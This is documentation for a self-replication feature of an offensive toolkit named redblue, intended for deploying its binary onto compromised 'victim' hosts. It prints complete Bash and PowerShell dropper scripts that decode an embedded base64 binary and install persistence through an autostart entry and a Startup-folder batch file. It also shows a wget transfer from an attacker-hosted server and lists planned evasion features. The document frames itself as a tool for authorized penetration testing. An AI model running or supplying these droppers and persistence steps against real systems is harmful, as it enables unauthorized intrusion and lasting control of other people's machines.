# Self-Replication: Deploy redblue Binary to Victims

## TL;DR
Step-by-step guide for pushing the redblue binary onto owned hosts, handling OS differences, and staying compliant with authorized-engagement rules.

**⚠️ AUTHORIZED USE ONLY ⚠️**

This feature is for:
- ✅ Authorized penetration testing engagements
- ✅ CTF competitions
- ✅ Bug bounty programs (with scope approval)
- ✅ Your own security audits
- ✅ Education and research

**Never use on systems you don't own or without explicit written authorization.**

---

## Overview

The self-replication module allows you to deploy the full redblue binary to victim systems during authorized security assessments. This enables:

- **Binary deployment** - Extract and transfer the current rb binary to targets
- **Cross-platform support** - Generate deployment scripts for Linux, Windows, and MacOS
- **Persistence mechanisms** - Optional installation for maintaining access
- **Zero dependencies** - Generated scripts require only base64 (built into all modern systems)

## Technical Implementation

The self-replication module works by:

1. **Binary Extraction** - Reading the current rb executable from disk
2. **Base64 Encoding** - Encoding the binary using our crypto module
3. **Script Generation** - Creating platform-specific deployment scripts
4. **Execution** - Scripts decode and deploy the binary on target systems

**File**: `src/modules/exploit/self_replicate.rs`

```rust
pub struct SelfReplicator {
    binary_path: PathBuf,           // Auto-detected current binary
    encoded_payload: Option<String>, // Base64-encoded binary
    target_os: String,               // linux, windows, macos
    persistence: bool,               // Enable persistence mechanisms
}
```

## Usage

### Basic Deployment

Generate a deployment script for Linux:

```bash
rb exploit payload replicate --os linux --output deploy.sh
```

This creates `deploy.sh` containing:
- Base64-encoded rb binary
- Deployment logic to `/tmp/.rb`
- Execution verification

### Windows Deployment

Generate PowerShell deployment script:

```bash
rb exploit payload replicate --os windows --output deploy.ps1
```

Outputs `deploy.ps1` with:
- Base64-encoded binary
- PowerShell deployment to `%TEMP%\rb.exe`
- Execution verification

### MacOS Deployment

Generate bash script for MacOS:

```bash
rb exploit payload replicate --os macos --output deploy.sh
```

### With Persistence

Enable persistence mechanisms during deployment:

```bash
rb exploit payload replicate --os linux --persist --output deploy.sh
```

**Linux persistence methods:**
- Copy to `~/.local/bin/rb`
- Create autostart entry at `~/.config/autostart/rb.desktop`

**Windows persistence methods:**
- Create batch file in Startup folder
- Auto-launches `rb shell` on user login

### Output to STDOUT

Generate script without saving to file:

```bash
rb exploit payload replicate --os linux
```

## Command Reference

### Synopsis

```bash
rb exploit payload replicate [OPTIONS]
```

### Options

| Flag | Short | Description | Default |
|------|-------|-------------|---------|
| `--os <OS>` | `-o` | Target operating system (linux, windows, macos) | linux |
| `--persist` | `-p` | Enable persistence mechanisms | false |
| `--output <FILE>` | `-f` | Output file path | stdout |

### Examples

```bash
# Linux deployment (no persistence)
rb exploit payload replicate --os linux --output deploy.sh

# Windows with persistence
rb exploit payload replicate --os windows --persist --output deploy.ps1

# MacOS to stdout (for piping)
rb exploit payload replicate --os macos > deploy.sh

# Quick Linux deployment with persistence
rb exploit payload replicate -o linux -p -f deploy.sh
```

## Generated Script Structure

### Linux/MacOS Bash Script

```bash
#!/bin/bash
# redblue self-replication deployment script
# ⚠️ AUTHORIZED USE ONLY

set -e

# Base64-encoded redblue binary
PAYLOAD="<base64_encoded_binary>"

# Deploy binary
echo "[+] Deploying redblue binary..."
echo "$PAYLOAD" | base64 -d > /tmp/.rb
chmod +x /tmp/.rb
echo "[+] Binary deployed to /tmp/.rb"

# Enable persistence (if --persist flag used)
echo "[+] Installing persistence..."
cp /tmp/.rb ~/.local/bin/rb 2>/dev/null || true
mkdir -p ~/.config/autostart 2>/dev/null || true
cat > ~/.config/autostart/rb.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=redblue
Exec=$HOME/.local/bin/rb shell
Hidden=true
EOF
echo "[+] Persistence installed"

# Execute redblue
echo "[+] Launching redblue..."
/tmp/.rb --version
echo "[+] Deployment complete!"
```

### Windows PowerShell Script

```powershell
# redblue self-replication deployment script (PowerShell)
# ⚠️ AUTHORIZED USE ONLY

$ErrorActionPreference = "Stop"

# Base64-encoded redblue binary
$payload = @"
<base64_encoded_binary>
"@

# Deploy binary
Write-Host "[+] Deploying redblue binary..."
$bytes = [System.Convert]::FromBase64String($payload)
$targetPath = "$env:TEMP\rb.exe"
[System.IO.File]::WriteAllBytes($targetPath, $bytes)
Write-Host "[+] Binary deployed to $targetPath"

# Enable persistence (if --persist flag used)
Write-Host "[+] Installing persistence..."
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\rb.bat"
Set-Content -Path $startupPath -Value "@echo off`nstart /b $targetPath repl"
Write-Host "[+] Persistence installed"

# Execute redblue
Write-Host "[+] Launching redblue..."
& $targetPath --version
Write-Host "[+] Deployment complete!"
```

## Deployment Workflow

### Step 1: Generate Script

On your attack machine:

```bash
rb exploit payload replicate --os linux --persist --output deploy.sh
```

### Step 2: Transfer Script

Transfer `deploy.sh` to target via:
- SSH: `scp deploy.sh user@target:/tmp/deploy.sh`
- Web server: `python3 -m http.server 8080` → `wget http://attacker:8080/deploy.sh`
- Reverse shell: Copy-paste script content

### Step 3: Execute on Target

```bash
# On target system
chmod +x deploy.sh
./deploy.sh
```

### Step 4: Verify Deployment

```bash
# Check if binary deployed
ls -lh /tmp/.rb

# Check if persistence installed
ls -lh ~/.local/bin/rb
cat ~/.config/autostart/rb.desktop

# Test execution
/tmp/.rb --version
```

## Persistence Mechanisms

### Linux

**Binary location**: `~/.local/bin/rb`

**Autostart**: XDG autostart desktop entry

```
~/.config/autostart/rb.desktop
```

**Removal**:
```bash
rm ~/.local/bin/rb
rm ~/.config/autostart/rb.desktop
```

### Windows

**Binary location**: `%TEMP%\rb.exe`

**Autostart**: Startup folder batch file

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rb.bat
```

**Removal**:
```powershell
del "$env:TEMP\rb.exe"
del "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\rb.bat"
```

### MacOS

Same as Linux (XDG autostart compatible).

## Binary Size

Current binary size: **2.7 MB**

The generated deployment scripts will contain the entire rb binary encoded as base64, resulting in:
- Base64 overhead: ~33% (base64 encoding increases size by 1/3)
- Final script size: ~3.6 MB

**Considerations**:
- Small enough for manual transfer (copy-paste, wget)
- Fits in most memory-based file systems (/tmp)
- Can be compressed with gzip for transfer (reduces to ~1 MB)

## Security Considerations

### Detection Evasion

**⚠️ This feature is for AUTHORIZED testing only - NOT for malicious use**

The generated scripts are:
- **Not obfuscated** - Clear bash/PowerShell code
- **Not encrypted** - Base64 is encoding, not encryption
- **Easily detected** - AV/EDR will likely flag large base64 payloads

**Detection vectors**:
- Large base64 strings in scripts
- Writing executables to /tmp or %TEMP%
- Autostart persistence modifications
- Network transfer of large scripts

### Cleanup

Always clean up after authorized testing:

```bash
# Linux
rm /tmp/.rb
rm ~/.local/bin/rb
rm ~/.config/autostart/rb.desktop

# Windows
del %TEMP%\rb.exe
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rb.bat"
```

## Use Cases

### 1. Post-Exploitation (Authorized)

After gaining initial access via authorized testing:

```bash
# Generate deployment script
rb exploit payload replicate --os linux --persist -o deploy.sh

# Transfer and execute on target
# (via existing shell/access)
```

### 2. CTF Competitions

Deploy full redblue toolkit on CTF target machines:

```bash
# Quick deployment without persistence
rb exploit payload replicate --os linux -o deploy.sh
```

### 3. Red Team Exercises

Simulate attacker behavior during red team engagements:

```bash
# Full deployment with persistence
rb exploit payload replicate --os windows --persist -o deploy.ps1
```

## Limitations

1. **Binary size** - 2.7 MB may be too large for some transfer methods
2. **No obfuscation** - Scripts are easily readable
3. **AV detection** - Will likely be flagged by antivirus
4. **Platform-specific** - Must know target OS in advance
5. **No encryption** - Binary transmitted in base64 (not encrypted)

## Future Enhancements

- [ ] Gzip compression for smaller scripts
- [ ] XOR encoding for basic obfuscation
- [ ] Multi-stage deployment (dropper + payload)
- [ ] Custom persistence locations
- [ ] Script polymorphism (randomize variable names)
- [ ] Encryption with key-based decryption

## Legal & Ethical Notice

**This feature implements self-replication and persistence mechanisms commonly associated with malware.**

You MUST:
- ✅ Have explicit written authorization before use
- ✅ Document all deployments in engagement reports
- ✅ Remove all deployed binaries after testing
- ✅ Inform the client about deployment and cleanup

You MUST NOT:
- ❌ Use on systems without authorization
- ❌ Deploy for malicious purposes
- ❌ Leave deployed binaries after engagement ends
- ❌ Use to cause harm or disruption

**Unauthorized use may violate:**
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws in your jurisdiction

**Always consult legal counsel and follow rules of engagement.**

## Related Documentation

- [EXPLOIT.md](/domains/exploit.md) - Full exploitation framework documentation
- [netcat-ultimate.md](/guides/netcat-ultimate.md) - Netcat-style reverse shells
- [cli-semantics.md](/cli-semantics.md) - Command structure reference

## Module Implementation

**Source file**: `src/modules/exploit/self_replicate.rs`

**Public API**:

```rust
impl SelfReplicator {
    pub fn new() -> Result<Self, String>
    pub fn with_os(mut self, os: &str) -> Self
    pub fn with_persistence(mut self, enable: bool) -> Self
    pub fn extract_binary(&mut self) -> Result<(), String>
    pub fn generate_script(&self) -> Result<String, String>
    pub fn save_script(&self, output_path: &str) -> Result<(), String>
    pub fn binary_size(&self) -> Result<u64, String>
    pub fn binary_path(&self) -> &PathBuf
}
```

**Usage in code**:

```rust
use crate::modules::exploit::self_replicate::SelfReplicator;

let mut replicator = SelfReplicator::new()?
    .with_os("linux")
    .with_persistence(true);

replicator.extract_binary()?;
let script = replicator.generate_script()?;
replicator.save_script("deploy.sh")?;
```

## Testing

Run tests for self-replication module:

```bash
cargo test --lib self_replicate
```

**Test coverage**:
- ✅ Replicator creation
- ✅ OS targeting (Linux, Windows, MacOS)
- ✅ Persistence configuration
- ✅ Binary size retrieval
- ⏳ Script generation (requires full build)

## FAQ

**Q: What's the difference between this and a reverse shell?**

A: Reverse shells (`rb exploit payload shell`) are lightweight code snippets that connect back to your listener. Self-replication deploys the entire rb binary (2.7 MB) to the target, giving you the full redblue toolkit on the victim system.

**Q: Why would I deploy the full binary?**

A: When you have initial access but want to use redblue's capabilities (scanning, enumeration, lateral movement, etc.) directly from the compromised system without proxying through your attack box.

**Q: Can I deploy to multiple targets?**

A: Yes, generate one deployment script and execute it on multiple targets. The script is self-contained.

**Q: Will this bypass antivirus?**

A: No. This is NOT an evasion tool. Expect detection by modern AV/EDR. Use only in authorized environments where detection is acceptable (or disabled).

**Q: How do I reduce the script size?**

A: Currently not supported. Future enhancements may include gzip compression or multi-stage deployment.

**Q: Can I customize the deployment location?**

A: Not yet. Current locations are hardcoded:
- Linux: `/tmp/.rb`
- Windows: `%TEMP%\rb.exe`
- MacOS: `/tmp/.rb`

**Q: What if the target has no internet access?**

A: Perfect! The deployment script is self-contained with the binary embedded. No external dependencies or downloads required.

**Q: Is the binary stripped of debug symbols?**

A: Yes, when compiled in release mode (`cargo build --release`), the binary is stripped and optimized.

---

**Remember: With great power comes great responsibility. Always get authorization first.**
